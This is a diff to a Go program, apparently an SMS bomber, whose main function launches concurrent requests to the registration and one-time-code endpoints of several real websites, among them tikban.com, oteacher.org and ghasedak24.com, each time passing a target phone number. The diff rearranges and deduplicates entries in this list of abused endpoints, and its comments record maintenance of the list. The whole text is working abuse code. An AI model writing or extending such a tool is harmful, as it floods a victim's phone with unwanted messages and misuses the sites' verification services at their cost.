@@ -203,6 +203,9 @@ func main() {
 		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)   // add site
+		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
+			"CellPhone": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://oteacher.org/api/user/register/mobile", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site = captcha
@@ -419,12 +422,6 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://ghasedak24.com/user/otp", map[string]interface{}{
 			"mobile": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
-			"CellPhone": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
-			"phoneNumber": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://ketabchi.com/api/v1/auth/requestVerificationCodee", map[string]interface{}{
 			"phoneNumber": phone,
